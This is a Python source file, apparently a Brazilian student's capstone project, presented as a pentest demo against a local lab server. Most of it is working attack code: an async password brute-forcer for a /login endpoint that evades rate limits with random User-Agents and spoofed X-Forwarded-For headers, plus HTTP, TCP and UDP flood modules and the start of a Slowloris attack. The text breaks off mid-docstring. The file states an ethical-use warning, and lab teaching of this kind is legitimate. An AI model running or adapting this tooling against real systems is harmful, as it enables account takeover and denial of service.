#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
netlab_pentest.py — Ferramenta de Demonstração de Pentest
══════════════════════════════════════════════════════════
Demonstra ataques controlados contra o servidor de laboratório do
NetLab Educacional (painel_servidor.py).

Módulos disponíveis
───────────────────
  [1] Força Bruta Assíncrona   — dicionário numérico contra /login
  [2] Teste de Estresse / DoS  — HTTP flood, TCP flood, Slowloris
  [3] Enumeração de Endpoints  — scanner de rotas + análise de headers
  [4] Interceptação HTTP       — captura de formulários em texto puro

Dependências
────────────
  pip install aiohttp requests rich

Uso ético
─────────
  Use exclusivamente contra o servidor NetLab local (localhost / LAN).
  Nunca direcione esta ferramenta a sistemas sem autorização.

Autor  : Yuri Gonçalves Pavão
TCC    : Técnico em Informática — IFFar Campus Uruguaiana
Versão : 3.0
"""

from __future__ import annotations

import asyncio
import calendar
import os
import random
import re
import socket
import ssl
import sys
import time
import threading
from abc       import ABC, abstractmethod
from dataclasses import dataclass, field
from typing    import Dict, Iterator, List, Optional, Tuple

# ── Dependências opcionais ───────────────────────────────────────────────────

try:
    import aiohttp
    _AIOHTTP_OK = True
except ImportError:
    _AIOHTTP_OK = False

try:
    import requests as _req_sync
    _REQUESTS_OK = True
except ImportError:
    _REQUESTS_OK = False

try:
    from rich.console  import Console
    from rich.progress import (Progress, SpinnerColumn, BarColumn,
                               TaskProgressColumn, MofNCompleteColumn,
                               TimeElapsedColumn, TimeRemainingColumn)
    from rich.table    import Table
    from rich.panel    import Panel
    from rich.text     import Text
    from rich          import box as rich_box
    _RICH_OK  = True
    console   = Console()
except ImportError:
    _RICH_OK  = False
    console   = None  # type: ignore[assignment]


# ══════════════════════════════════════════════════════════════════════════════
# Exceções personalizadas
# ══════════════════════════════════════════════════════════════════════════════

class SenhaEncontrada(Exception):
    """Exceção interna para interromper todas as tasks quando a senha é achada."""
    pass


# ══════════════════════════════════════════════════════════════════════════════
# Cores ANSI e utilitários de impressão
# ══════════════════════════════════════════════════════════════════════════════

_VERDE   = "\033[92m"
_VERM    = "\033[91m"
_AMAR    = "\033[93m"
_CIANO   = "\033[96m"
_RESET   = "\033[0m"
_NEGRITO = "\033[1m"
_MAG     = "\033[95m"


def _cor(cor: str, msg: str) -> None:
    if _RICH_OK and console:
        mapa = {_VERDE: "green", _VERM: "red",
                _AMAR: "yellow", _CIANO: "cyan", _MAG: "magenta"}
        tag = mapa.get(cor, "white")
        console.print(f"[{tag}]{msg}[/{tag}]")
    else:
        print(f"{cor}{msg}{_RESET}")


def ok(msg: str)      -> None: _cor(_VERDE, f"  [✓] {msg}")
def erro(msg: str)    -> None: _cor(_VERM,  f"  [✗] {msg}")
def aviso(msg: str)   -> None: _cor(_AMAR,  f"  [!] {msg}")
def info(msg: str)    -> None: _cor(_CIANO, f"  [·] {msg}")
def destaque(msg: str)-> None: _cor(_MAG,   msg)


def limpar_tela() -> None:
    os.system("cls" if os.name == "nt" else "clear")


def entrada(prompt: str, padrao: Optional[str] = None,
            obrigatorio: bool = False) -> str:
    """Lê entrada do usuário com valor padrão opcional."""
    marca = f" [{padrao}]" if padrao else ""
    valor = input(f"\n  {_CIANO}{prompt}{_RESET}{marca}: ").strip()
    if not valor and padrao is not None:
        return padrao
    if obrigatorio and not valor:
        erro("Campo obrigatório.")
        return entrada(prompt, padrao, obrigatorio)
    return valor


def tabela(linhas: List[List[str]], cabecalho: List[str],
           titulo: str = "") -> None:
    """Exibe tabela formatada — usa Rich quando disponível."""
    if _RICH_OK and console:
        t = Table(title=titulo, box=rich_box.ROUNDED, border_style="cyan",
                  show_header=True, header_style="bold cyan")
        for col in cabecalho:
            t.add_column(col)
        for l in linhas:
            t.add_row(*l)
        console.print(t)
    else:
        print(f"\n{_NEGRITO}{titulo}{_RESET}")
        print("  " + "  |  ".join(cabecalho))
        print("  " + "-" * 60)
        for l in linhas:
            print("  " + "  |  ".join(l))
        print()


def banner() -> None:
    versao = "3.0"
    if _RICH_OK and console:
        t = Text()
        t.append("  NetLab Pentest ", style="bold cyan")
        t.append(f"v{versao}", style="bold magenta")
        t.append("  —  Demonstração de Segurança Educacional", style="dim cyan")
        console.print(Panel(t, border_style="cyan", padding=(0, 2)))
        libs = []
        libs.append("[green]aiohttp ✓[/green]"  if _AIOHTTP_OK  else "[red]aiohttp ✗[/red]")
        libs.append("[green]requests ✓[/green]" if _REQUESTS_OK else "[red]requests ✗[/red]")
        libs.append("[green]rich ✓[/green]")
        console.print("  Dependências: " + "  ".join(libs))
        console.print(
            "  [dim]Alvo padrão: [bold]http://localhost:8080[/bold] "
            "(servidor NetLab local)[/dim]\n"
        )
    else:
        print(f"""
{_CIANO}{_NEGRITO}
╔══════════════════════════════════════════════════════════════╗
║   NetLab Pentest v{versao}  —  Demonstração de Segurança        ║
║   TCC · Técnico em Informática · IFFar Uruguaiana           ║
╚══════════════════════════════════════════════════════════════╝
{_RESET}""")
        print(f"  aiohttp: {'OK' if _AIOHTTP_OK else 'ausente'}   "
              f"requests: {'OK' if _REQUESTS_OK else 'ausente'}\n")


# ══════════════════════════════════════════════════════════════════════════════
# Constantes de rede e wordlists
# ══════════════════════════════════════════════════════════════════════════════

_MAX_CONCORRENCIA_BF     = 512
_MAX_CONCORRENCIA_STRESS = 1500
_TIMEOUT_PADRAO          = 3.0
_LOTE_MAXIMO             = 400   # coroutines por lote no stress

_KEYWORDS_FALHA = frozenset({
    "invalido", "incorreto", "erro", "falhou", "invalid", "incorrect",
    "error", "failed", "wrong", "denied", "acesso negado",
    "senha errada", "bad credentials", "credenciais inválidas",
})
_KEYWORDS_SUCESSO = frozenset({
    "dashboard", "bem-vindo", "welcome", "logout", "sucesso",
    "success", "home", "logado", "login permitido",
})

_USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) "
    "AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
)

# Senhas numéricas — o servidor NetLab aceita apenas dígitos no modo demo
_SENHAS_COMUNS = [
    "123456","654321","111111","000000","123123","112233","12345678",
    "87654321","11223344","44332211","10203040","20304050","12344321",
    "11111111","22222222","33333333","44444444","55555555","66666666",
    "77777777","88888888","99999999","00000000","102030","121314",
    "147258","159357","123654","321654","456123","789456","753951",
    "147852","258369","369258","741852","852963","963741",
    "1234","4321","9999","1111","0000","0001","1000",
    "2000","2001","2002","2003","2004","2005","2006","2007","2008",
    "2009","2010","2011","2012","2013","2014","2015","2016","2017",
    "2018","2019","2020","2021","2022","2023","2024","2025","2026",
    "1970","1980","1985","1990","1995","2030",
    "010203","030201","112358","314159","271828","161803",
    "12344321","43211234","192837","564738","102938",
    "1234567890","9876543210","1234567","7654321",
]

# Endpoints para o scanner
_ENDPOINTS_SCANNER = [
    "/", "/login", "/signup", "/formulario", "/admin", "/api/dados",
    "/ping", "/dashboard", "/config", "/status", "/health",
    "/robots.txt", "/sitemap.xml", "/.env", "/backup",
    "/api", "/api/v1", "/api/users", "/api/admin",
]


# ══════════════════════════════════════════════════════════════════════════════
# Geradores de wordlist
# ══════════════════════════════════════════════════════════════════════════════

def gerar_intervalo(inicio: int, fim: int) -> Iterator[str]:
    """Gera senhas numéricas de `inicio` a `fim` (inclusive)."""
    return (str(i) for i in range(inicio, fim + 1))


def gerar_por_comprimento(tamanhos: List[int]) -> Iterator[str]:
    """Gera todas as senhas numéricas para cada comprimento listado."""
    for t in tamanhos:
        ini = 10 ** (t - 1) if t > 1 else 0
        fim = 10 ** t - 1
        yield from (str(i) for i in range(ini, fim + 1))


def gerar_datas(ano_ini: int, ano_fim: int, fmt: str) -> Iterator[str]:
    """Gera senhas no formato de data (DDMMAAAA, DDMMAA, AAAAMMDD etc.)."""
    formatos: Dict = {
        "DDMMAAAA": lambda d, m, a: f"{d:02d}{m:02d}{a:04d}",
        "DDMMAA":   lambda d, m, a: f"{d:02d}{m:02d}{a % 100:02d}",
        "MMDDAAAA": lambda d, m, a: f"{m:02d}{d:02d}{a:04d}",
        "AAAAMMDD": lambda d, m, a: f"{a:04d}{m:02d}{d:02d}",
        "AAMMDD":   lambda d, m, a: f"{a % 100:02d}{m:02d}{d:02d}",
    }
    fn = formatos.get(fmt)
    if not fn:
        raise ValueError(f"Formato desconhecido: {fmt}")
    for ano in range(ano_ini, ano_fim + 1):
        for mes in range(1, 13):
            for dia in range(1, calendar.monthrange(ano, mes)[1] + 1):
                yield fn(dia, mes, ano)


def carregar_wordlist(caminho: str) -> Optional[List[str]]:
    """Carrega wordlist de arquivo de texto, uma senha por linha."""
    from pathlib import Path
    p = Path(caminho)
    if not p.exists():
        erro(f"Arquivo não encontrado: {caminho}")
        return None
    try:
        palavras = [
            l.strip()
            for l in p.read_text(encoding="utf-8", errors="ignore").splitlines()
            if l.strip()
        ]
        if not palavras:
            erro("Wordlist vazia.")
            return None
        ok(f"{len(palavras):,} senhas carregadas de {caminho}")
        return palavras
    except Exception as e:
        erro(f"Erro ao ler wordlist: {e}")
        return None


# ══════════════════════════════════════════════════════════════════════════════
# Helpers de detecção e rede
# ══════════════════════════════════════════════════════════════════════════════

def _ip_falso() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def _cabecalhos_http(host: str) -> bytes:
    agente = random.choice(_USER_AGENTS)
    ip     = _ip_falso()
    return (
        f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {agente}\r\n"
        f"X-Forwarded-For: {ip}\r\nX-Real-IP: {ip}\r\n"
        f"Accept: text/html\r\nConnection: keep-alive\r\n\r\n"
    ).encode("ascii")


def _indica_sucesso(status: int, corpo: str, localizacao: str) -> bool:
    """Heurística: decidir se um login teve sucesso pela resposta HTTP."""
    if status in (301, 302, 303, 307, 308):
        if localizacao and "/login" not in localizacao.lower():
            return True
    if status == 200:
        c = corpo.lower()
        if any(k in c for k in _KEYWORDS_SUCESSO):
            return True
        if not any(k in c for k in _KEYWORDS_FALHA):
            return True
    return False


def _detecta_bloqueio(status: int, corpo: str) -> bool:
    """Detecta rate limiting ou WAF na resposta."""
    return status == 429 or (
        status in (403, 503)
        and any(w in corpo.lower() for w in ("bloqueado", "blocked", "captcha"))
    )


def resolver_host(host: str) -> Optional[str]:
    """Resolve hostname para IP. Retorna None se falhar."""
    try:
        ip = socket.gethostbyname(host)
        ok(f"{host} → {ip}")
        return ip
    except socket.gaierror:
        erro(f"Não foi possível resolver: {host}")
        return None


def testar_conectividade(url: str) -> bool:
    """Testa se o servidor está acessível antes de iniciar o ataque."""
    if not _REQUESTS_OK:
        aviso("requests ausente — pulando teste de conectividade.")
        return True
    try:
        r = _req_sync.get(url, timeout=4, allow_redirects=False)
        ok(f"Servidor acessível — HTTP {r.status_code}")
        return True
    except Exception as e:
        aviso(f"Servidor inacessível: {e}")
        return False


# ══════════════════════════════════════════════════════════════════════════════
# Classe base para os módulos de ataque
# ══════════════════════════════════════════════════════════════════════════════

class BaseAtaque(ABC):
    """Interface comum para todos os módulos de ataque."""

    def __init__(self) -> None:
        # Contadores — usados apenas no event loop asyncio (sem Lock necessário)
        self._tentativas: int = 0
        self._erros:      int = 0
        self._recusados:  int = 0
        self._inicio:  Optional[float] = None
        self._fim:     Optional[float] = None

    @abstractmethod
    def configurar(self) -> None: ...

    @abstractmethod
    def executar(self) -> None: ...

    @abstractmethod
    def mostrar_resultado(self) -> None: ...

    def executar_interativo(self) -> None:
        """Fluxo completo: configurar → confirmar → executar → resultado."""
        self.configurar()
        if not self._confirmar():
            aviso("Cancelado pelo usuário.")
            return
        self._inicio = time.monotonic()
        self.executar()
        self._fim = time.monotonic()
        self.mostrar_resultado()

    def _confirmar(self) -> bool:
        resp = entrada("Iniciar? (s/N)", "n")
        return resp.lower().startswith("s")

    @property
    def _tempo_decorrido(self) -> float:
        i = self._inicio or time.monotonic()
        f = self._fim    or time.monotonic()
        return max(f - i, 1e-9)


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 1 — Força Bruta Assíncrona
# ══════════════════════════════════════════════════════════════════════════════

class ModuloBruteForce(BaseAtaque):
    """
    Força bruta assíncrona contra /login do servidor NetLab.

    Estratégias de wordlist
    ─────────────────────────
      1. Senhas numéricas comuns (lista interna)
      2. Intervalo numérico (ex.: 0000 → 9999)
      3. Por comprimento (ex.: todos os de 4 e 6 dígitos)
      4. Wordlist de arquivo (uma senha por linha)
      5. Datas formatadas (aniversários, anos etc.)
      6. Combinar: intervalo completo (força bruta total)

    Mecanismos de evasão
    ─────────────────────
      • User-Agent aleatório a cada requisição
      • Cabeçalho X-Forwarded-For com IP falso
      • Backoff exponencial com jitter em resposta 429
      • Detecção automática de bloqueio e pausa adaptativa
    """

    def __init__(self) -> None:
        super().__init__()
        self._url_login:    str           = ""
        self._usuario:      str           = ""
        self._senhas:       List[str]     = []
        self._concorrencia: int           = 64
        self._timeout:      float         = 3.0
        self._delay:        float         = 0.0
        self._proxy:        Optional[str] = None
        self._resultados:   List[Tuple[str, str]] = []
        self._waf_detectado: bool         = False

    # ── Configuração ──────────────────────────────────────────────────────────

    def configurar(self) -> None:
        print(f"\n{_CIANO}{_NEGRITO}  ── Configuração: Força Bruta ──{_RESET}")

        url_base = entrada("URL base do servidor", "http://localhost:8080")
        if not url_base.startswith("http"):
            url_base = "http://" + url_base
        self._url_login = url_base.rstrip("/") + "/login"

        testar_conectividade(url_base)

        self._usuario = entrada("Usuário alvo", "admin", obrigatorio=True)
        ok(f"Alvo: {self._usuario} em {self._url_login}")

        self._senhas = list(self._menu_wordlist())

        self._concorrencia = int(entrada(
            f"Coroutines simultâneas (1–{_MAX_CONCORRENCIA_BF})", "64"
        ))
        self._concorrencia = max(1, min(self._concorrencia, _MAX_CONCORRENCIA_BF))

        self._delay   = float(entrada("Delay entre req (s)", "0.0"))
        self._timeout = max(0.1, float(entrada("Timeout por req (s)", "3.0")))
        self._proxy   = entrada("Proxy HTTP (vazio = nenhum)", "") or None

        tabela([
            ["URL Login",       self._url_login],
            ["Usuário",         self._usuario],
            ["Total de senhas", f"{len(self._senhas):,}"],
            ["Coroutines",      str(self._concorrencia)],
            ["Delay",           f"{self._delay}s"],
            ["Timeout",         f"{self._timeout}s"],
            ["Proxy",           self._proxy or "—"],
            ["Motor",           "asyncio + aiohttp" if _AIOHTTP_OK else "requests (fallback)"],
        ], ["Parâmetro", "Valor"], "Resumo — Força Bruta")

    def _menu_wordlist(self) -> List[str]:
        print(f"""
  {_AMAR}Estratégia de senhas:{_RESET}
    1  — Senhas numéricas comuns ({len(_SENHAS_COMUNS)} entradas)
    2  — Intervalo numérico (ex: 0000–9999)
    3  — Por comprimento (ex: todos os de 4 dígitos = 10 000 senhas)
    4  — Wordlist de arquivo
    5  — Datas formatadas (aniversários, anos)
    6  — Intervalo completo (força bruta total — lento para > 6 dígitos)""")

        opcao = entrada("Escolha [1–6]", "1")

        if opcao == "1":
            aviso(f"{len(_SENHAS_COMUNS)} senhas comuns selecionadas.")
            return list(_SENHAS_COMUNS)

        if opcao == "2":
            ini = int(entrada("Valor inicial", "0"))
            fim = int(entrada("Valor final",   "9999"))
            total = fim - ini + 1
            aviso(f"{total:,} senhas no intervalo.")
            return list(gerar_intervalo(ini, fim))

        if opcao == "3":
            raw = entrada("Comprimentos (ex: 4 ou 4,5,6 ou 4-6)", "4")
            if "-" in raw:
                a, b = map(int, raw.split("-", 1))
                tamanhos = list(range(a, b + 1))
            elif "," in raw:
                tamanhos = [int(x.strip()) for x in raw.split(",")]
            else:
                tamanhos = [int(raw.strip())]
            total = sum(
                10**t - (10**(t-1) if t > 1 else 0)
                for t in tamanhos
            )
            aviso(f"≈ {total:,} senhas a testar.")
            confirma = entrada(f"Confirmar {total:,} senhas? (s/N)", "n")
            if not confirma.lower().startswith("s"):
                return self._menu_wordlist()
            return list(gerar_por_comprimento(tamanhos))

        if opcao == "4":
            caminho = entrada("Caminho do arquivo", obrigatorio=True)
            palavras = carregar_wordlist(caminho)
            if not palavras:
                return self._menu_wordlist()
            return palavras

        if opcao == "5":
            ano_ini = int(entrada("Ano inicial", "1980"))
            ano_fim = int(entrada("Ano final",   "2010"))
            print(f"""
    Formatos disponíveis:
      DDMMAAAA  ex: 15081995
      DDMMAA    ex: 150895
      MMDDAAAA  ex: 08151995
      AAAAMMDD  ex: 19950815
      AAMMDD    ex: 950815""")
            fmt = entrada("Formato", "DDMMAAAA").upper()
            datas = list(gerar_datas(ano_ini, ano_fim, fmt))
            aviso(f"{len(datas):,} datas geradas ({fmt}).")
            return datas

        if opcao == "6":
            digitos = int(entrada("Quantidade de dígitos (ex: 4 = 0000–9999)", "4"))
            total   = 10 ** digitos
            aviso(f"Força bruta total: {total:,} senhas ({digitos} dígitos).")
            confirma = entrada(f"Confirmar {total:,} senhas? (s/N)", "n")
            if not confirma.lower().startswith("s"):
                return self._menu_wordlist()
            return list(gerar_intervalo(0, total - 1))

        aviso("Opção inválida — usando senhas comuns.")
        return list(_SENHAS_COMUNS)

    # ── Execução ──────────────────────────────────────────────────────────────

    def executar(self) -> None:
        if _AIOHTTP_OK:
            asyncio.run(self._executar_async())
        elif _REQUESTS_OK:
            aviso("aiohttp ausente — usando requests (modo síncrono, mais lento).")
            self._executar_sync()
        else:
            erro("Nenhuma biblioteca HTTP disponível. pip install aiohttp requests")

    # ── Motor assíncrono (aiohttp) ────────────────────────────────────────────

    async def _executar_async(self) -> None:
        senhas      = list(self._senhas)
        total       = len(senhas)
        encontrado  = asyncio.Event()

        # Fila com sentinels para sinalizar fim aos workers
        fila: asyncio.Queue = asyncio.Queue(
            maxsize=min(self._concorrencia * 4, 200_000)
        )

        async def produtor() -> None:
            for senha in senhas:
                if encontrado.is_set():
                    break
                await fila.put(senha)
            # Um sentinel por worker para garantir encerramento limpo
            for _ in range(self._concorrencia):
                await fila.put(None)

        conector = aiohttp.TCPConnector(
            limit=self._concorrencia,
            limit_per_host=self._concorrencia,
            ttl_dns_cache=300,
            use_dns_cache=True,
            force_close=False,
            enable_cleanup_closed=True,
            ssl=False,
        )
        obj_timeout = aiohttp.ClientTimeout(
            total=self._timeout,
            connect=min(self._timeout, 2.0),
        )

        async with aiohttp.ClientSession(
            connector=conector,
            timeout=obj_timeout,
        ) as sessao:
            tarefa_prod = asyncio.create_task(produtor())

            if _RICH_OK and console:
                progresso = Progress(
                    SpinnerColumn(), "[cyan]BruteForce[/cyan]",
                    BarColumn(), TaskProgressColumn(),
                    MofNCompleteColumn(), TimeElapsedColumn(),
                    TimeRemainingColumn(), console=console,
                    transient=True,
                )
                tid = progresso.add_task("", total=total)
                progresso.start()
            else:
                progresso = tid = None

            workers = [
                asyncio.create_task(
                    self._worker(sessao, fila, encontrado, progresso, tid)
                )
                for _ in range(self._concorrencia)
            ]

            try:
                await asyncio.gather(tarefa_prod, *workers, return_exceptions=True)
            except SenhaEncontrada:
                # Cancela todas as tasks ainda ativas
                for t in [tarefa_prod] + workers:
                    if not t.done():
                        t.cancel()
                # Aguarda o cancelamento (evita warnings de tasks pendentes)
                await asyncio.gather(*[t for t in [tarefa_prod] + workers if not t.done()],
                                     return_exceptions=True)

            if progresso:
                progresso.stop()

    async def _worker(self, sessao: "aiohttp.ClientSession",
                      fila: asyncio.Queue,
                      encontrado: asyncio.Event,
                      progresso, tid) -> None:
        backoff = 1.0

        while not encontrado.is_set():
            senha = await fila.get()
            if encontrado.is_set():  # <-- VERIFICAÇÃO IMEDIATA
                return
            if senha is None:
                return

            status, corpo, local = await self._requisicao(sessao, senha)
            self._tentativas += 1

            if progresso and tid is not None:
                progresso.advance(tid)

            # Bloqueio / WAF detectado — pausa com backoff exponencial
            if status == 429 or _detecta_bloqueio(status, corpo):
                if not self._waf_detectado:
                    self._waf_detectado = True
                    aviso(
                        f"\n  Rate limiting detectado (HTTP {status}) — "
                        f"backoff ativo..."
                    )
                jitter = random.uniform(0, backoff * 0.3)
                await asyncio.sleep(backoff + jitter)
                backoff = min(backoff * 2.0, 120.0)
                await fila.put(senha)   # recoloca para nova tentativa
                continue

            backoff = max(1.0, backoff * 0.85)

            if _indica_sucesso(status, corpo, local):
                encontrado.set()
                self._resultados.append((self._usuario, senha))
                destaque(f"\n\n  ✓ SENHA ENCONTRADA: {_NEGRITO}{senha}{_RESET}")
                raise SenhaEncontrada()   # interrompe esta task e será capturada pelo gather

            if status == 0:
                self._erros += 1

            if self._delay > 0:
                await asyncio.sleep(self._delay)

            # Progresso a cada 2000 tentativas (sem Rich)
            if not _RICH_OK and self._tentativas % 2000 == 0:
                tps = self._tentativas / self._tempo_decorrido if self._inicio else 0
                info(f"[{self._tentativas:,}/{len(self._senhas):,}] "
                     f"{tps:.0f} req/s")

    async def _requisicao(self, sessao: "aiohttp.ClientSession",
                           senha: str) -> Tuple[int, str, str]:
        """Envia POST /login e retorna (status, corpo, location)."""
        try:
            async with sessao.post(
                self._url_login,
                data={"usuario": self._usuario, "senha": senha},
                proxy=self._proxy,
                allow_redirects=False,
                headers={
                    "User-Agent":      random.choice(_USER_AGENTS),
                    "X-Forwarded-For": _ip_falso(),
                },
            ) as resp:
                corpo    = await resp.text(errors="ignore")
                local    = resp.headers.get("Location", "")
                return resp.status, corpo, local
        except (asyncio.TimeoutError, Exception):
            return 0, "", ""

    # ── Fallback síncrono (requests) ──────────────────────────────────────────

    def _executar_sync(self) -> None:
        import queue as _queue
        import concurrent.futures

        cfg_senhas   = list(self._senhas)
        fila: _queue.Queue = _queue.Queue(maxsize=self._concorrencia * 4)
        parar = threading.Event()

        def produtor():
            for s in cfg_senhas:
                if parar.is_set():
                    break
                fila.put(s)
            for _ in range(self._concorrencia):
                fila.put(None)

        threading.Thread(target=produtor, daemon=True).start()

        def worker():
            sessao = _req_sync.Session()
            while not parar.is_set():
                senha = fila.get()
                if senha is None:
                    return
                try:
                    r = sessao.post(
                        self._url_login,
                        data={"usuario": self._usuario, "senha": senha},
                        timeout=self._timeout,
                        allow_redirects=False,
                        headers={
                            "User-Agent":      random.choice(_USER_AGENTS),
                            "X-Forwarded-For": _ip_falso(),
                        },
                    )
                    self._tentativas += 1
                    if _indica_sucesso(r.status_code, r.text, r.headers.get("Location", "")):
                        self._resultados.append((self._usuario, senha))
                        parar.set()
                        return
                except Exception:
                    self._erros += 1
                time.sleep(self._delay)

        with concurrent.futures.ThreadPoolExecutor(
            max_workers=self._concorrencia
        ) as executor:
            concurrent.futures.wait(
                [executor.submit(worker) for _ in range(self._concorrencia)]
            )

    # ── Resultado ─────────────────────────────────────────────────────────────

    def mostrar_resultado(self) -> None:
        tps = self._tentativas / self._tempo_decorrido
        tabela([
            ["Tentativas",     f"{self._tentativas:,}"],
            ["Erros/timeout",  f"{self._erros:,}"],
            ["Tempo total",    f"{self._tempo_decorrido:.2f}s"],
            ["Taxa média",     f"{tps:.1f} req/s"],
            ["WAF/rate limit", "Sim" if self._waf_detectado else "Não"],
        ], ["Métrica", "Valor"], "Resultado — Força Bruta")

        if self._resultados:
            _, senha = self._resultados[0]
            print(f"\n  {_VERDE}{_NEGRITO}{'='*52}")
            print(f"  [✓] SUCESSO!  Usuário: {self._usuario}  |  Senha: {senha}")
            print(f"  {'='*52}{_RESET}")
        else:
            erro("Nenhuma senha válida encontrada no espaço testado.")

        if self._waf_detectado:
            aviso("Rate limiting / bloqueio detectado durante o teste.\n"
                  "  O modo SEGURO do servidor resistiu com sucesso.")


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 2 — Teste de Estresse / DoS
# ══════════════════════════════════════════════════════════════════════════════

class ModuloEstresse(BaseAtaque):
    """
    Demonstração de ataque de negação de serviço (DoS) contra o servidor NetLab.

    Modos disponíveis
    ──────────────────
      http      — HTTP GET flood (aiohttp assíncrono)
      tcp       — TCP SYN/connect flood (asyncio raw)
      slowloris — Conexões HTTP incompletas que esgotam o pool de threads

    O painel do servidor NetLab mostra em tempo real o impacto:
    req/s, bloqueios, barra de carga e tabela de IPs bloqueados.
    """

    _DURACAO_MAX = 300   # segundos

    def __init__(self) -> None:
        super().__init__()
        self._ip:           str   = "127.0.0.1"
        self._porta:        int   = 8080
        self._host:         str   = "localhost"
        self._tipo:         str   = "http"
        self._concorrencia: int   = 200
        self._timeout:      float = 2.0
        self._duracao:      float = 60.0
        self._repeticoes:   int   = 20

    # ── Configuração ──────────────────────────────────────────────────────────

    def configurar(self) -> None:
        print(f"\n{_CIANO}{_NEGRITO}  ── Configuração: Teste de Estresse ──{_RESET}")
        print(f"""
  {_AMAR}Modos disponíveis:{_RESET}
    http      — GET flood assíncrono (mais eficiente, mede req/s)
    tcp       — conexões TCP raw (demonstra esgotamento de sockets)
    slowloris — conexões HTTP incompletas (esgota pool de threads)
    udp       — datagramas UDP (demonstra UDP flood)
""")
        alvo = entrada("IP ou hostname alvo", "localhost")
        self._ip = alvo if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", alvo) \
                        else (resolver_host(alvo) or "127.0.0.1")
        self._host = alvo

        self._porta = int(entrada("Porta", "8080"))
        if not 1 <= self._porta <= 65535:
            erro("Porta inválida.")
            self._porta = 8080

        tipo = entrada("Tipo (http/tcp/slowloris/udp)", "http").lower()
        if tipo not in ("http", "tcp", "slowloris", "udp"):
            aviso("Tipo inválido — usando HTTP.")
            tipo = "http"
        self._tipo = tipo

        self._concorrencia = max(1, min(
            int(entrada(f"Conexões simultâneas (máx {_MAX_CONCORRENCIA_STRESS})", "200")),
            _MAX_CONCORRENCIA_STRESS,
        ))

        self._timeout = max(0.1, float(entrada("Timeout (s)", "2.0")))

        dur = float(entrada(f"Duração total (s, máx {self._DURACAO_MAX})", "60"))
        self._duracao = max(1, min(dur, self._DURACAO_MAX))

        self._repeticoes = max(1, int(entrada("Repetições por worker", "20")))

        tabela([
            ["Alvo",        f"{self._ip}:{self._porta} ({self._host})"],
            ["Tipo",        self._tipo.upper()],
            ["Workers",     str(self._concorrencia)],
            ["Duração",     f"{self._duracao:.0f}s"],
            ["Repetições",  str(self._repeticoes)],
            ["Timeout",     f"{self._timeout}s"],
        ], ["Parâmetro", "Valor"], "Resumo — Teste de Estresse")

    # ── Execução ──────────────────────────────────────────────────────────────

    def executar(self) -> None:
        asyncio.run(self._executar_async())

    async def _executar_async(self) -> None:
        loop       = asyncio.get_event_loop()
        tempo_fim  = loop.time() + self._duracao
        semaforo   = asyncio.Semaphore(self._concorrencia)

        info(
            f"\n  {self._tipo.upper()} → {self._ip}:{self._porta} "
            f"({self._concorrencia} simultâneos por {self._duracao:.0f}s)"
        )
        info("  Ctrl+C para interromper.\n")

        tarefa_stats = asyncio.create_task(self._loop_stats(tempo_fim))

        # Socket UDP reutilizado por todos os workers (evita criação por pacote)
        sock_udp: Optional[socket.socket] = None
        if self._tipo == "udp":
            sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        total_tarefas = self._concorrencia * self._repeticoes
        todas_tarefas: list = []

        try:
            for i in range(0, total_tarefas, _LOTE_MAXIMO):
                if loop.time() >= tempo_fim:
                    break
                tamanho_lote = min(_LOTE_MAXIMO, total_tarefas - i)
                lote = [
                    asyncio.create_task(
                        self._despachar(semaforo, tempo_fim, sock_udp)
                    )
                    for _ in range(tamanho_lote)
                ]
                todas_tarefas.extend(lote)
                await asyncio.sleep(0)   # cede o event loop entre lotes

            await asyncio.gather(*todas_tarefas, return_exceptions=True)

        except (KeyboardInterrupt, asyncio.CancelledError):
            aviso("\n  Interrompido pelo usuário.")
            for t in todas_tarefas:
                t.cancel()
        finally:
            if sock_udp:
                sock_udp.close()
            tarefa_stats.cancel()
            sys.stdout.write("\n")
            sys.stdout.flush()

    async def _despachar(self, sem: asyncio.Semaphore,
                          tempo_fim: float,
                          sock_udp: Optional[socket.socket]) -> None:
        if asyncio.get_event_loop().time() >= tempo_fim:
            return
        async with sem:
            if asyncio.get_event_loop().time() >= tempo_fim:
                return
            try:
                if self._tipo == "tcp":
                    await self._ataque_tcp()
                elif self._tipo == "udp":
                    self._ataque_udp(sock_udp)
                elif self._tipo in ("http", "https"):
                    await self._ataque_http()
                elif self._tipo == "slowloris":
                    await self._ataque_slowloris()
            except (ConnectionRefusedError, ConnectionResetError):
                self._recusados += 1
            except Exception:
                self._erros += 1

    async def _ataque_tcp(self) -> None:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(self._ip, self._porta),
            timeout=self._timeout,
        )
        writer.write(b"GET / HTTP/1.0\r\n\r\n")
        await writer.drain()
        writer.close()
        self._tentativas += 1

    def _ataque_udp(self, sock: Optional[socket.socket]) -> None:
        s = sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(os.urandom(1024), (self._ip, self._porta))
        self._tentativas += 1

    async def _ataque_http(self) -> None:
        ctx = None
        if self._tipo == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(self._ip, self._porta, ssl=ctx),
            timeout=self._timeout,
        )
        writer.write(_cabecalhos_http(self._host))
        await writer.drain()
        writer.close()
        self._tentativas += 1

    async def _ataque_slowloris(self) -> None:
        """
        Slowloris: abre conexão HTTP, envia headers parciais e mantém viva
        com dados inúteis — esgota o pool de threads do HTTPServer sem
